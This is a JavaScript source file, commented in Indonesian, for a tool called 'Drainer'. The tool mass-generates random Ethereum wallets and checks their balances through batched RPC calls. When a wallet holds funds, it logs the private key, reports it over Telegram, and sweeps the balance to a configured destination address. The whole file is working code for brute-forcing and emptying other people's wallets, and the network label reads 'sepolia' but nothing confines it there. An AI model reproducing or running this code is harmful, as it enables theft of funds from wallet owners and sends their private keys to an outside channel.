'use strict';

const { ethers }  = require('ethers');
const cfg         = require('./utils/config');
const tg          = require('./utils/telegram');
const {
  logHistory, logSuccess, saveWallet,
  saveStats, saveSession, loadSession,
  printStats,
} = require('./utils/logger');

const ZERO      = ethers.constants.Zero;
const GAS_LIMIT = cfg.gasLimit;

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

// ── Pool provider (round-robin) ───────────────────────────────────────────────
const RPC_URLS = Array.isArray(cfg.providerURL) ? cfg.providerURL : [cfg.providerURL];

// ── Batch JSON-RPC: cek N wallet dalam 1 HTTP request ────────────────────────
async function batchGetBalances(wallets, rpcUrl) {
  const body = wallets.map((w, i) => ({
    jsonrpc: '2.0',
    method:  'eth_getBalance',
    params:  [w.address, 'latest'],
    id:      i,
  }));

  const res = await fetch(rpcUrl, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify(body),
    signal:  AbortSignal.timeout(8000),
  });

  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  const results = await res.json();

  // Kembalikan BigNumber per wallet (null jika error)
  return results.map((r) => {
    if (r && r.result) return ethers.BigNumber.from(r.result);
    return null;
  });
}

class Drainer {
  constructor() {
    this.dest         = cfg.destinationAddress;
    this.batchSize    = cfg.batchSize;
    this.concurrency  = cfg.concurrency;
    this.maxAttempts  = cfg.maxAttempts;
    this._stopped     = false;
    this._startTime   = Date.now();
    this._rpcErrors   = 0;
    this._urlIndex    = 0;

    const session     = loadSession();
    this.totalCount   = session ? session.totalCount   : 0;
    this.successCount = session ? session.successCount : 0;

    if (session) {
      process.stdout.write(`\x1b[33m[Resume] Melanjutkan dari attempt #${this.totalCount}\x1b[0m\n`);
    }
  }

  _nextUrl() {
    const url = RPC_URLS[this._urlIndex % RPC_URLS.length];
    this._urlIndex++;
    return url;
  }

  _elapsed() { return Date.now() - this._startTime; }

  _rate() {
    return (this.totalCount / (this._elapsed() / 1000 || 1)).toFixed(1);
  }

  _snapshot() {
    return {
      totalCount:   this.totalCount,
      successCount: this.successCount,
      rpcErrors:    this._rpcErrors,
      ratePerSec:   this._rate(),
      uptimeMs:     this._elapsed(),
      timestamp:    new Date().toISOString(),
    };
  }

  stop() {
    this._stopped = true;
    saveSession({ totalCount: this.totalCount, successCount: this.successCount });
    saveStats(this._snapshot());
    tg.notifyStopped(this.totalCount, this.successCount);
  }

  async _drainWallet(wallet, balance) {
    const provider = new ethers.providers.JsonRpcProvider(this._nextUrl());
    const signer   = wallet.connect(provider);

    try {
      const gasPrice = await provider.getGasPrice();
      const gasCost  = gasPrice.mul(GAS_LIMIT);
      const netValue = balance.sub(gasCost);

      if (netValue.lte(ZERO)) {
        logSuccess(`Saldo tidak cukup untuk gas — wallet disimpan, TX dilewati.`);
        return;
      }

      const tx = await signer.sendTransaction({
        to:       this.dest,
        value:    netValue,
        gasLimit: GAS_LIMIT,
        gasPrice,
      });
      logSuccess(`TX Hash: ${tx.hash}`);
      tg.notifyTxSent(tx.hash);
      await tx.wait(1);
      logSuccess(`TX Confirmed: ${tx.hash}`);
    } catch (err) {
      logSuccess(`TX gagal: ${err.message}`);
    }
  }

  async _processBatch() {
    if (this._stopped) return;

    // Cek batas maxAttempts
    if (this.maxAttempts > 0 && this.totalCount >= this.maxAttempts) {
      this._stopped = true;
      process.stdout.write(`\n\x1b[33m[Draino] maxAttempts (${this.maxAttempts}) tercapai.\x1b[0m\n`);
      this.stop();
      process.exit(0);
    }

    // Generate batch wallet secara lokal (tidak perlu RPC)
    const wallets = Array.from({ length: this.batchSize }, () => ethers.Wallet.createRandom());

    // Hitung semua attempt sekarang
    this.totalCount += wallets.length;

    // 1 HTTP request untuk semua wallet dalam batch
    let balances;
    for (let retry = 0; retry < cfg.retryLimit; retry++) {
      try {
        balances = await batchGetBalances(wallets, this._nextUrl());
        break;
      } catch {
        this._rpcErrors++;
        if (retry < cfg.retryLimit - 1) await sleep(cfg.retryDelay * (retry + 1));
      }
    }

    if (!balances) {
      // Semua retry gagal — log dan lanjut
      wallets.forEach((w, i) => {
        logHistory(`${this.totalCount - wallets.length + i + 1} | ${w.address} | RPC_ERROR`);
      });
      return;
    }

    // Proses hasil — cari wallet dengan saldo > 0
    for (let i = 0; i < wallets.length; i++) {
      const balance    = balances[i];
      const wallet     = wallets[i];
      const attemptNum = this.totalCount - wallets.length + i + 1;

      if (!balance) {
        logHistory(`${attemptNum} | ${wallet.address} | RPC_NULL`);
        continue;
      }

      const balanceEth = ethers.utils.formatEther(balance);
      logHistory(`${attemptNum} | ${wallet.address} | ${balanceEth} ETH`);

      if (balance.gt(ZERO)) {
        this.successCount++;

        const walletData = {
          attempt:   attemptNum,
          address:   wallet.address,
          privateKey: wallet.privateKey,
          balance:   balanceEth,
          network:   'sepolia',
          timestamp: new Date().toISOString(),
        };

        saveWallet(walletData);
        tg.notifyWalletFound(walletData);
        logSuccess(`Wallet #${this.successCount} | ${wallet.address} | ${balanceEth} ETH`);

        // Drain async — tidak blok worker
        this._drainWallet(wallet, balance).catch(() => {});
      }
    }
  }

  async _worker() {
    while (!this._stopped) {
      await this._processBatch();
    }
  }

  _startStatsLoop() {
    setInterval(() => {
      if (this._stopped) return;
      const snap = this._snapshot();
      printStats(snap.totalCount, snap.successCount, snap.ratePerSec, snap.uptimeMs, snap.rpcErrors);
      saveStats(snap);
      saveSession({ totalCount: this.totalCount, successCount: this.successCount });
    }, cfg.statsInterval);
  }

  async run() {
    tg.notifyStarted(this.concurrency);
    this._startStatsLoop();
    const workers = Array.from({ length: this.concurrency }, () => this._worker());
    await Promise.all(workers);
  }
}

module.exports = new Drainer();
